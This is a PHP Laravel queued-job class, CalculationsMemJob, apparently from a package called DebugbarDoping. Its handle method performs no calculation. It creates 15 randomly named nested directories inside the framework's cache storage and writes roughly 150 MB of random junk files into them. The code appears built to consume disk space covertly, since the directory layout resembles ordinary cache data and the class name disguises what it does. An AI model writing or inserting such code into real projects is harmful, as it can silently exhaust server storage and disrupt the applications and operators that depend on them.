<?php

namespace Robinboost\DebugbarDoping\Jobs;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use function storage_path;

class CalculationsMemJob implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    private $a;

    public function __construct($a)
    {
        $this->a = $a;
    }

    public function handle()
    {
        $mainDir = 'cache/data/';
        for ($i = 1; $i <= 15; $i++) {
            $uuid = Str::uuid();
            $subDir = storage_path('framework/' . $mainDir .  Str::random(2). '/'.$uuid.'/' . md5($uuid.$i).'/'.$i);
            if (!file_exists($subDir)) {
                mkdir($subDir, 0755, true);
            }
            foreach (range(1, 10) as $index) {
                $text = Str::random(10000);
                $result = str_repeat($text, 100);

                file_put_contents($subDir . '/' . Str::random(2),  $result);
            }
        }
    }
}
